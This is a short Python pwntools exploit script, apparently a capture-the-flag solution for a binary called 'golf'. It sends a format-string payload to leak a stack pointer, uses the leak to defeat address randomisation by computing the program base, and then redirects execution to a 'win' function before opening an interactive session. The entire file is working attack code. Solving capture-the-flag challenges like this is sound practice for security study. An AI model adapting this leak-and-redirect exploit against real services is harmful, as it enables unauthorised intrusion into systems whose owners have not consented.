#!/usr/bin/env python3

from pwn import *

exe = ELF("./golf")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    r.recv()
    r.sendline("%190$lx")
    leak = int(r.recvline().decode().split("hello: ")[1], 16)
    exe.address = leak - exe.symbols["main"]
    # log.info(f"leak: {hex(leak)}")
    r.recv()
    r.sendline(hex(exe.symbols['win']))
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
